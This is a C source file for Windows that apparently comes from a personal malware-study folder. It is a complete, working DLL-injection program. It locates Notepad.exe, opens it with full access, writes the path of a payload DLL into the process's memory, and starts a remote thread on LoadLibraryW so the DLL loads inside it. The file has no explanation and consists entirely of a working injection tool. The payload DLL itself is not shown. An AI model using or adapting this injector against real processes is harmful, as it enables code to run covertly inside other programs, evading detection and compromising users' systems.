#include<windows.h>
#include<stdio.h>
#include<tlhelp32.h>

#define path L"D:\\Mal\\Learn\\ProcessInjection\\DLL Injection\\payload2.dll"
DWORD exitcode = 0;
DWORD find_pid(const char* process_name){
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (strcmp(pe.szExeFile, process_name) == 0) {
            printf("[+] Found process %s with PID: %d\n", process_name, pe.th32ProcessID);
            CloseHandle(snapshot);
            return pe.th32ProcessID;
        }
    } while (Process32Next(snapshot, &pe));
    printf("[-] Process not found\n");
    CloseHandle(snapshot);
    return 0;
}

int main(void){
    HANDLE open = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        find_pid("Notepad.exe")
    );

    if ( open == NULL){
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        CloseHandle(open);
        return EXIT_FAILURE;
    }

    LPVOID addr = VirtualAllocEx(
        open,
        NULL,
        sizeof(path),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if ( addr == NULL){
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        CloseHandle(open);  
        return EXIT_FAILURE;
    }

    BOOL write = WriteProcessMemory(
        open,
        addr,
        path,
        sizeof(path),
        NULL
    );
    if ( write == FALSE){
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(open, addr, 0, MEM_RELEASE);
        CloseHandle(open);
        return EXIT_FAILURE;
    }

    FARPROC loadlib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if ( loadlib == NULL){
        printf("[-] GetProcAddress failed: %d\n", GetLastError());
        VirtualFreeEx(open, addr, 0, MEM_RELEASE);
        CloseHandle(open);
        return EXIT_FAILURE;
    }

    HANDLE thread = CreateRemoteThread(
        open,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadlib,
        addr,
        0,
        NULL
    );
    if ( thread == NULL){
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(open, addr, 0, MEM_RELEASE);
        CloseHandle(open);
        return EXIT_FAILURE;
    }
    printf("[+] OpenProcess success: %p\n", open);
    printf("[+] VirtualAllocEx success: %p\n", addr);
    printf("[+] WriteProcessMemory success: %p\n", write);
    printf("[+] CreateRemoteThread success: %p\n", thread);
    printf("[+] LoadLibraryW address: %p\n", loadlib);
    GetExitCodeThread(thread, &exitcode); 
    printf("[+] Thread exit code: %d\n", exitcode);
    CloseHandle(thread);
    VirtualFreeEx(open, addr, 0, MEM_RELEASE);
    CloseHandle(open);
    return EXIT_SUCCESS;
}